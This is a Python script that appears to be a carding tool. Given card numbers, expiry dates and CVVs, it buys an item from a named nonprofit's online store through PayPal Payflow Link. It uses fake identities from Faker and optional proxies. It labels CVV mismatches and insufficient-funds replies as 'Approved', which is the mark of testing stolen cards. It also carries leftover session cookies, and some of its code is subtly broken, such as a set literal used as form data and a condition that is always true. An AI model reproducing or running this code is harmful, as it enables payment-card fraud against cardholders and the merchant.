from faker import Faker
import random
import string
from httpx import AsyncClient

fake = Faker()

def random_email():
    random_letters = "".join(random.choices(string.ascii_lowercase, k=10))
    return f"{random_letters}@gmail.com"
email = random_email()

async def payflow33(cc, mes, ano, cvv, proxyg=None):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as session:

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'xid=29BrREOKmdRtFZHVssaajIqD7fTLMoqk; _ga=GA1.2.1077899826.1731126781; _gid=GA1.2.224635950.1731126781; __stripe_mid=2dca611e-56d6-43f0-a65d-3ae8edef18d8089f5b; viewedResources=a%3A15%3A%7Bi%3A0%3Bs%3A32%3A%22fb70f1e6c692bd31631e7760d9b87e7d%22%3Bi%3A1%3Bs%3A32%3A%22cd7a512b506a8f15d832e0f3908f8535%22%3Bi%3A2%3Bs%3A32%3A%22bc847f0243d20b3d4c3a65ef5960fed2%22%3Bi%3A3%3Bs%3A32%3A%22bded5309cbdc9823858e478dec1b5c58%22%3Bi%3A4%3Bs%3A32%3A%222bc4a9ce4f4423aded806f7210077411%22%3Bi%3A5%3Bs%3A32%3A%22751dfbd73827cf3efa10e8d2e2f26631%22%3Bi%3A6%3Bs%3A32%3A%22e75742e5fb5f015dbaba2a5416cf9fd6%22%3Bi%3A7%3Bs%3A32%3A%225bb094f478593cec332dd38e16ef4257%22%3Bi%3A8%3Bs%3A32%3A%22ff2d6ad37ba37ae963e86b56576e63c8%22%3Bi%3A9%3Bs%3A32%3A%22ced35b36fc3cdfb0184fe189607261e7%22%3Bi%3A10%3Bs%3A32%3A%2280ed5ec5d9343c17b39d1d6cb3f1e8c0%22%3Bi%3A11%3Bs%3A32%3A%229f25d582b437fc21165b22cab60d1446%22%3Bi%3A12%3Bs%3A32%3A%22d4936307e2775a0e5872848cca132b03%22%3Bi%3A13%3Bs%3A32%3A%2293740619d892dc0cfef5bed43312d0e5%22%3Bi%3A14%3Bs%3A32%3A%2243ce6fcd84de226a9dbbfe314f16a1bf%22%3B%7D; _ga_CB47D095XK=GS1.2.1731146040.2.1.1731146076.0.0.0',
            'Origin': 'https://store.stutteringhelp.org',
            'Pragma': 'no-cache',
            'Referer': 'https://store.stutteringhelp.org/alan-rabinowitz-for-national-stuttering-awareness-week-.html',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'ajaxRefererTarget': 'product',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }


        data = {
            'target': 'cart',
            'action': 'add',
            'mode': 'search',
            'product_id': '152',
            'category_id': '5',
            'expressCheckout': '',
            'inContext': '1',
            'cancelUrl': '/alan-rabinowitz-for-national-stuttering-awareness-week-.html',
            'returnURL': '/alan-rabinowitz-for-national-stuttering-awareness-week-.html',
            'amount': '1',
        }

        req1 = await session.post('https://store.stutteringhelp.org/', headers=headers, data=data)

        req2 = await session.get('https://store.stutteringhelp.org/?target=cart')
        form_id = req2.text.split("form_id: '")[1].split("'")[0]

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'xid=oE4TNuGJfdR61tiZdXEC2tx7HaQQeFG1; _ga=GA1.2.1500615215.1731146267; _gid=GA1.2.2078875000.1731146267; _gat=1; viewedResources=a%3A10%3A%7Bi%3A0%3Bs%3A32%3A%22ced35b36fc3cdfb0184fe189607261e7%22%3Bi%3A1%3Bs%3A32%3A%2280ed5ec5d9343c17b39d1d6cb3f1e8c0%22%3Bi%3A2%3Bs%3A32%3A%229b953f9ce304f4d81f5c6ca3b3555675%22%3Bi%3A3%3Bs%3A32%3A%22bded5309cbdc9823858e478dec1b5c58%22%3Bi%3A4%3Bs%3A32%3A%22e75742e5fb5f015dbaba2a5416cf9fd6%22%3Bi%3A5%3Bs%3A32%3A%225bb094f478593cec332dd38e16ef4257%22%3Bi%3A6%3Bs%3A32%3A%2243ce6fcd84de226a9dbbfe314f16a1bf%22%3Bi%3A7%3Bs%3A32%3A%22fb70f1e6c692bd31631e7760d9b87e7d%22%3Bi%3A8%3Bs%3A32%3A%22112a66e2d954de93556b1c8941e7bcbc%22%3Bi%3A9%3Bs%3A32%3A%22a5904d47762cca63bea938dd6ef1bc80%22%3B%7D; _ga_CB47D095XK=GS1.2.1731146040.2.1.1731146363.0.0.0',
            'Origin': 'https://store.stutteringhelp.org',
            'Pragma': 'no-cache',
            'Referer': 'https://store.stutteringhelp.org/?target=checkout',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }


        data = {
            'target': 'checkout',
            'action': 'update_profile',
            'returnURL': f'?target=checkout&action=update_profile&xcart_form_id={form_id}',
            'same_address': '1',
            'xcart_form_id': form_id,
            'email': email,
        }

        req3 = await session.post('https://store.stutteringhelp.org/', headers=headers, data=data)

        params = {
            'target': 'checkout',
            'action': 'update_profile',
            'xcart_form_id': form_id,
        }

        req4 = await session.get('https://store.stutteringhelp.org/', params=params, headers=headers)

        params = {
            'target': 'checkout',
        }

        req5 = await session.get('https://store.stutteringhelp.org/', params=params, headers=headers)

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://store.stutteringhelp.org',
            'Pragma': 'no-cache',
            'Referer': 'https://store.stutteringhelp.org/?target=checkout',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'ajaxRefererTarget': 'checkout',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        params = ''

        data = {
            'target': 'checkout',
            'action': 'update_profile',
            'returnURL': f'?target=checkout&action=update_profile&xcart_form_id={form_id}',
            'xcart_form_id': form_id,
            'shippingAddress[firstname]': fake.first_name(),
            'shippingAddress[lastname]': fake.last_name(),
            'shippingAddress[street]': fake.street_address(),
            'shippingAddress[city]': fake.city(),
            'shippingAddress[country_code]': 'US',
            'shippingAddress[state_id]': '589',
            'shippingAddress[custom_state]': '',
            'shippingAddress[zipcode]': fake.zipcode(),
            'shippingAddress[phone]': fake.phone_number(),
            'email': email,
            'password': '',
        }

        req6 = await session.post('https://store.stutteringhelp.org/', params=params, headers=headers, data=data)

        data = {
            'target': 'checkout',
            'action': 'payment',
            'xcart_form_id': form_id,
            'returnURL': '/?target=checkout',
            'methodId': '41',
        }

        req7 = await session.post('https://store.stutteringhelp.org/', params=params, headers=headers, data=data)

        data = {
            'target': 'checkout',
            'action': 'checkout',
            'xcart_form_id': form_id,
            'returnURL': '/?target=checkout',
            'notes': '',
        }

        reqpayflow = await session.post('https://store.stutteringhelp.org/', params=params, headers=headers, data=data)

        params = {
            'target': 'checkoutPayment',
        }

        req8 = await session.get('https://store.stutteringhelp.org/', params=params, headers=headers)
        print(req8.text)
        iframe_src = req8.text.split('<iframe id="pay_iframe"')[1].split('src="')[1].split('"')[0]
        securetoken = iframe_src.split("SECURETOKEN=")[1].split("&")[0]
        securetokenid = iframe_src.split("SECURETOKENID=")[1].split("&")[0]
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            # 'cookie': 'enforce_policy=gdpr_v2.1; cookie_check=yes; d_id=df0e8f5ec6b34e37a33307f9c9e128f91729908555060; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; ui_experience=did_set%3Dtrue%26login_preference%3D%26login_type%3DEMAIL_PASSWORD%26home%3D2; TfXMWj95u2_Zf1Kmv_GCUOjlGG8=ho1g1R-UghVGsqAgNprVRtBKJ8vSlQqtR8NMYOAn2Ty-qjH3f_5CPlvRyzSmmYoHfEQ3lMJfEhGpwHwDKxyjv1YjWZwwnROJAq7xnoXKAZOJK6Er3Lwe8t_GgRH3mlaiHqRe0PO3jc-7oWvlNSn1kTTfkMfCcncwlgK5DMlA5OjcQNjur53-5C0cw34; login_email=dangerouskilluachk%40gmail.com; rmuc=ijsPyy-0eB2XzksDld5Gr21yeRdSU1wAhdSSoE8ZlPlFOy5QSKU8KBnVlZ-KhypAUBsvRly0AAVnxCQgDTDY1IUJ5lePR2rS6BoUBOjn_1UoYpeSd7DjZJHefa7XU7Z8lRR5-VVQkC6OMFUGsN34Kg_9QzTnIVd828G0IoVlLrnISvy4tgAKXnsSHe__2WfjHIvrv_gNU7okFW8c; X-PP-ADS=AToBP1kdZ9umBgwFem1jWgrVsLIddOM7AUtDIGcWw5MnCaMPupES3HMbK-3Q; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6Ik1qUTNqcWhaSHVNLU0wcTZ6RHZ3NE5ZX1hNOTNqbGpqMTlfSzQ0VlUtekE2V2hiRHh4NkNjYnB2OVFKWk50MFhKWVJUZ25Ya1RsaWRlcXkzZlpRVXpGa09xdGxLN0Q1T0JwSDRuUWdMTTNlZTd0M2U5czlXMXdmRFpxVDlRV3p1cTVwMG9NbmgxbEZFX2R1UUVEQlcwSGJialh6NDZFUWdVcmdwUThXQWI4RlRLYTFNdjk1TzQ4QzZnRmUiLCJpYXQiOjE3MzEwMzQ5MTEsImV4cCI6MTczMTAzODUxMX0.JG85qk304X-HXskdbRbYG7r62dQKWhnF9n-XCIURffE; ts_c=vr%3Dfa40dfd51920a56af0d358e7fc1c5a55%26vt%3D10390b3f1930aa38ec974dedff35121d; PAYFLOWCOOKIE=02c7df8377-7c7d-4cOVF2Jn6HFTmvI3C7W8TLtWRAPlZW3LDyWOFB602hFWkjntAk9ZxARDzdtCR48S2pp3A; tcs=Payflow%3APaymentPage%3ATemplateC%7Cbtn_pay_cc; l7_az=dcg14.slc; LANG=es_XC%3BMX; tsrce=checkoutjs; ts=vreXpYrS%3D1762682695%26vteXpYrS%3D1731148495%26vr%3Dfa40dfd51920a56af0d358e7fc1c5a55%26vt%3D10390b3f1930aa38ec974dedff35121d%26vtyp%3Dreturn; x-pp-s=eyJ0IjoiMTczMTE0NjY5NjAzMiIsImwiOiIwIiwibSI6IjAifQ',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://store.stutteringhelp.org/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        params = {
            'SECURETOKEN': securetoken,
            'SECURETOKENID': securetokenid,
        }

        req9 = await session.get('https://payflowlink.paypal.com/', params=params, headers=headers)
        csrf_token = req9.text.split('<input name="CSRF_TOKEN" type="hidden" value="')[1].split('"')[0]
        print(csrf_token)
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'enforce_policy=gdpr_v2.1; cookie_check=yes; d_id=df0e8f5ec6b34e37a33307f9c9e128f91729908555060; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; ui_experience=did_set%3Dtrue%26login_preference%3D%26login_type%3DEMAIL_PASSWORD%26home%3D2; TfXMWj95u2_Zf1Kmv_GCUOjlGG8=ho1g1R-UghVGsqAgNprVRtBKJ8vSlQqtR8NMYOAn2Ty-qjH3f_5CPlvRyzSmmYoHfEQ3lMJfEhGpwHwDKxyjv1YjWZwwnROJAq7xnoXKAZOJK6Er3Lwe8t_GgRH3mlaiHqRe0PO3jc-7oWvlNSn1kTTfkMfCcncwlgK5DMlA5OjcQNjur53-5C0cw34; login_email=dangerouskilluachk%40gmail.com; rmuc=ijsPyy-0eB2XzksDld5Gr21yeRdSU1wAhdSSoE8ZlPlFOy5QSKU8KBnVlZ-KhypAUBsvRly0AAVnxCQgDTDY1IUJ5lePR2rS6BoUBOjn_1UoYpeSd7DjZJHefa7XU7Z8lRR5-VVQkC6OMFUGsN34Kg_9QzTnIVd828G0IoVlLrnISvy4tgAKXnsSHe__2WfjHIvrv_gNU7okFW8c; X-PP-ADS=AToBP1kdZ9umBgwFem1jWgrVsLIddOM7AUtDIGcWw5MnCaMPupES3HMbK-3Q; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6Ik1qUTNqcWhaSHVNLU0wcTZ6RHZ3NE5ZX1hNOTNqbGpqMTlfSzQ0VlUtekE2V2hiRHh4NkNjYnB2OVFKWk50MFhKWVJUZ25Ya1RsaWRlcXkzZlpRVXpGa09xdGxLN0Q1T0JwSDRuUWdMTTNlZTd0M2U5czlXMXdmRFpxVDlRV3p1cTVwMG9NbmgxbEZFX2R1UUVEQlcwSGJialh6NDZFUWdVcmdwUThXQWI4RlRLYTFNdjk1TzQ4QzZnRmUiLCJpYXQiOjE3MzEwMzQ5MTEsImV4cCI6MTczMTAzODUxMX0.JG85qk304X-HXskdbRbYG7r62dQKWhnF9n-XCIURffE; ts_c=vr%3Dfa40dfd51920a56af0d358e7fc1c5a55%26vt%3D10390b3f1930aa38ec974dedff35121d; PAYFLOWCOOKIE=02c7df8377-7c7d-4cOVF2Jn6HFTmvI3C7W8TLtWRAPlZW3LDyWOFB602hFWkjntAk9ZxARDzdtCR48S2pp3A; l7_az=dcg14.slc; LANG=es_XC%3BMX; tsrce=checkoutjs; x-pp-s=eyJ0IjoiMTczMTE0NjY5NjAzMiIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1762682722%26vteXpYrS%3D1731148522%26vr%3Dfa40dfd51920a56af0d358e7fc1c5a55%26vt%3D10390b3f1930aa38ec974dedff35121d%26vtyp%3Dreturn; tcs=Payflow%3APaymentPage%3ATemplateC%7Cbtn_pay_cc',
            'origin': 'https://payflowlink.paypal.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://payflowlink.paypal.com/?SECURETOKEN=JlAHYW60K3EaM01BBdeORFQWd&SECURETOKENID=6815ae00811c8d39aa591e601b391456',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        data = {
            "subaction", "",
            "CARDNUM", cc,
            "EXPMONTH", mes,
            "EXPYEAR", ano,
            "CVV2", cvv,
            "startdate_month", "",
            "startdate_year", "",
            "issue_number", "",
            "METHOD", "C",
            "PAYMETHOD", "C",
            "FIRST_NAME", fake.first_name(),
            "LAST_NAME", fake.last_name(),
            "template", "MINLAYOUT",
            "ADDRESS", fake.street_address(),
            "CITY", fake.city(),
            "STATE", fake.state(),
            "ZIP", fake.zipcode(),
            "COUNTRY", "US",
            "PHONE", "5059947000",
            "EMAIL", email,
            "SHIPPING_FIRST_NAME", fake.first_name(),
            "SHIPPING_LAST_NAME", fake.last_name(),
            "ADDRESSTOSHIP", fake.street_address(),
            "CITYTOSHIP", fake.city(),
            "STATETOSHIP", fake.state(),
            "ZIPTOSHIP", fake.zipcode(),
            "COUNTRYTOSHIP", "US",
            "PHONETOSHIP", fake.phone_number(),
            "EMAILTOSHIP", email,
            "TYPE", "S",
            "SHIPAMOUNT", "4.63",
            "TAX", "0.00",
            "INVOICE", "SFA_012213-8CAW",
            "VERBOSITY", "HIGH",
            "DISABLERECEIPT", "TRUE",
            "flag3dSecure", "",
            "CURRENCY", "USD",
            "STATE", fake.state(),
            "swipeData", "0",
            "SECURETOKEN", securetoken,
            "SECURETOKENID", securetokenid,
            "PARMLIST", "",
            "MODE", "",
            "CSRF_TOKEN", csrf_token,
            "referringTemplate", "minlayout",
        }


        req10 = await session.post('https://payflowlink.paypal.com/processTransaction.do', headers=headers, data=data) # type: ignore
        if "Verified" or "Approved" in req10.text:
            status = "Approved ✅"
            mensaje = "Charged 7.63$"
        else:
            try:
                avsdata = req5.text.split('type="hidden" name="AVSDATA" value="')[1].split('"')[0]
            except IndexError:
                    avsdata= "none"
            try:
                procvv = req5.text.split('type="hidden" name="PROCCVV2" value="')[1].split('"')[0]
            except IndexError:
                procvv = "none"
            try:
                mensaje = req5.text.split('type="hidden" name="RESPMSG" value="')[1].split('"')[0]
            except IndexError:
                mensaje = "none"
            
            if "CVV2 Mismatch" in mensaje:
                status = "Approved ✅"
            elif "Insufficient funds available" in mensaje or "Insufficient funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        
            return status,mensaje,procvv,avsdata